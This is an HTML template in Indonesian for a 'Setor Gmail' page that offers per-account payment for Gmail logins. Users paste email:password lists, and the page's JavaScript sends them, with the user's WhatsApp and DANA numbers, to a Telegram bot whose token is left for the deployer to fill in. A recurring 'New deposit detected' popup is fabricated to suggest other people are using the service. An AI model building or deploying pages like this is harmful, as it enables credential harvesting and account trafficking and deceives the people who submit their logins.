<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto Setor Gmail</title>

<style>
*{box-sizing:border-box}

body{
margin:0;
font-family: 'Segoe UI', sans-serif;
background:#020617;
color:#e5e7eb;
}

/* BACKGROUND GRID */
body::before{
content:"";
position:fixed;
width:100%;
height:100%;
background:
linear-gradient(#0f172a 1px, transparent 1px),
linear-gradient(90deg,#0f172a 1px, transparent 1px);
background-size:40px 40px;
opacity:0.2;
z-index:0;
}

/* CONTAINER */
.container{
position:relative;
z-index:2;
max-width:420px;
margin:50px auto;
padding:25px;
border-radius:16px;
background:rgba(15,23,42,0.8);
border:1px solid rgba(255,255,255,0.05);
box-shadow:0 0 60px rgba(0,0,0,0.8);
}

/* HEADER */
h1{
text-align:center;
font-size:20px;
margin-bottom:5px;
}

.sub{
text-align:center;
font-size:12px;
opacity:0.6;
margin-bottom:20px;
}

/* INPUT */
textarea,input{
width:100%;
padding:13px;
margin:8px 0;
border-radius:10px;
border:1px solid rgba(255,255,255,0.05);
background:#020617;
color:#e5e7eb;
transition:0.3s;
}

textarea:focus,input:focus{
outline:none;
border-color:#22c55e;
box-shadow:0 0 15px #22c55e55;
}

/* BUTTON */
button{
width:100%;
padding:14px;
margin-top:10px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#22c55e,#16a34a);
color:white;
font-weight:bold;
cursor:pointer;
transition:0.3s;
}

button:hover{
transform:scale(1.04);
box-shadow:0 0 20px #22c55e;
}

/* TOTAL BOX */
.stats{
background:#020617;
padding:10px;
border-radius:10px;
margin-top:5px;
border:1px solid rgba(255,255,255,0.05);
font-size:13px;
display:flex;
justify-content:space-between;
}

/* STATUS */
#status{
text-align:center;
margin-top:10px;
font-size:13px;
}

/* LIVE POPUP */
.popup{
position:fixed;
bottom:20px;
right:20px;
background:#020617;
border:1px solid rgba(255,255,255,0.1);
padding:10px;
border-radius:10px;
font-size:12px;
color:#22c55e;
}
</style>
</head>

<body>

<div class="container">
<h1>SETOR GMAIL</h1>
<div class="sub">Crypto System • Fast Processing</div>

<form id="form">

<textarea id="akun" rows="8" placeholder="email1:pass&#10;email2:pass&#10;(1 akun per baris)" required></textarea>

<input type="number" id="jumlah" readonly placeholder="Auto count">

<div class="stats">
<span id="count">0 akun</span>
<span id="total">Rp 0</span>
</div>

<input type="text" id="wa" placeholder="Nomor WhatsApp" required>
<input type="text" id="dana" placeholder="Nomor DANA" required>

<button>KIRIM SETORAN</button>

<p id="status"></p>

</form>
</div>

<script>

/* CONFIG */
const TOKEN = "ISI TOKEN LU";
const CHAT_ID = "5943311408";

let lastSubmit=0;

/* HITUNG */
akun.oninput=()=>{
let list=akun.value.split("\n").filter(x=>x.trim());
jumlah.value=list.length;
count.innerText=list.length+" akun";
total.innerText="Rp "+(list.length*1500);
};

/* SUBMIT */
form.addEventListener("submit",async(e)=>{
e.preventDefault();

if(Date.now()-lastSubmit<5000){
status.innerText="Tunggu sebentar...";
return;
}
lastSubmit=Date.now();

status.innerText="Processing...";

let list=akun.value.split("\n").filter(x=>x.includes("@"));

if(list.length==0){
status.innerText="Format salah!";
return;
}

const text=`📊 SETOR MASUK

📧 ${list.length} akun
💰 Rp ${list.length*1500}

${list.join("\n")}

WA: ${wa.value}
DANA: ${dana.value}`;

try{

await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

setTimeout(()=>{
window.open(`https://wa.me/${wa.value}?text=Setoran kamu sedang diproses`);
},1000);

status.innerText="SUCCESS";
form.reset();
count.innerText="0 akun";
total.innerText="Rp 0";

}catch{
status.innerText="FAILED";
}

});

/* POPUP */
setInterval(()=>{
let x=document.createElement("div");
x.className="popup";
x.innerText="New deposit detected";
document.body.appendChild(x);
setTimeout(()=>x.remove(),2000);
},6000);

</script>

</body>
</html>
